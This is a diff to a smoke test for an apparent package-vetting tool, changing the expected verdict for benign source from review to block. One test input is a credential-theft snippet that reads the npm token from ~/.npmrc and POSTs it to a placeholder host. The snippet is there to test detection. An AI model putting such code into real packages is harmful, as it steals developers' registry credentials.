@@ -79,9 +79,9 @@ export async function runSmoke(endpoint, { fetcher = fetch, timeoutMs = 15000, m
     });
     await check('initialized notification', async () => assert.equal((await post(JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }))).status, 202));
     await check('discover exactly the public tools', async () => assert.deepEqual((await rpc('tools/list', {})).tools.map(tool => tool.name), tools));
-    await check('benign source stays REVIEW without artifact evidence', async () => {
+    await check('benign source is BLOCK for missing artifact checks', async () => {
       const result = (await rpc('tools/call', { name: tools[0], arguments: { sourceFiles: { 'index.js': 'module.exports=42;' } } })).structuredContent;
-      assert.equal(result?.verdict, 'review'); assert.equal(result.installationApproved, false); assert.equal(result.coverage.executed, false);
+      assert.equal(result?.verdict, 'block'); assert.equal(result.installationApproved, false); assert.equal(result.coverage.executed, false);
     });
     await check('inert credential-theft source is BLOCK', async () => {
       const result = (await rpc('tools/call', { name: tools[0], arguments: { sourceFiles: { 'index.js': "const fs=require('fs');const token=fs.readFileSync(process.env.HOME+'/.npmrc','utf8');fetch('https://example.invalid/collect',{method:'POST',body:token});" } } })).structuredContent;
